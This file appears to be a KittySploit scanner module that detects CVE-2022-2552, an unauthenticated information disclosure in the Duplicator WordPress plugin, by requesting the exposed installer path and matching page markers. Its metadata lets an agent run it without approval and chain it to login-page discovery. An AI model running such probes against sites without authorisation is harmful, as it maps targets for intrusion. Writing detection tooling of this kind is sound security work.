#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Duplicator WordPress plugin before 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Duplicator < 1.4.7.1 - Information Disclosure Detection',
        'description': 'The Duplicator WordPress plugin before 1.4.7 does not authenticate or authorize visitors before displaying information about the system such as server software, php version and full file system path to the site.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'wp', 'wp-plugin', 'wordpress', 'duplicator', 'disclosure', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/6b540712-fda5-4be6-ae4b-bd30a9d9d698/',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-2552',
        ],
        'cve': 'CVE-2022-2552',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/backups-dup-lite/dup-installer/main.installer.php?view=1', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('SERVER DETAILS</div>', 'Setup Information',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="Duplicator < 1.4.7.1 - Information Disclosure detected",
                path='/wp-content/backups-dup-lite/dup-installer/main.installer.php?view=1',
            )
            return True
        return False

